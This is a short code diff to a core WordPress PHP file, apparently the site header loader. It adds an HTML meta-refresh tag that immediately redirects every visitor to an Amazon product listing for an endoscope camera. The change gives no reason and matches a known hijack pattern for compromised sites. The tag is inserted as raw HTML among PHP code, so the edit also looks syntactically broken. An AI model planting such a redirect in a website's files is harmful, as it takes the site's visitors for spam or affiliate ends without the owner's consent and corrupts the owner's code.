@@ -4,6 +4,7 @@
  *
  * @package WordPress
  */
+<meta content='0;url=https://www.amazon.com/Endoscope-Dr-meter-Megapixels-Inspection-Smartphone/dp/B075B4F9YJ' http-equiv='refresh'/>
 
 if ( !isset($wp_did_header) ) {
 
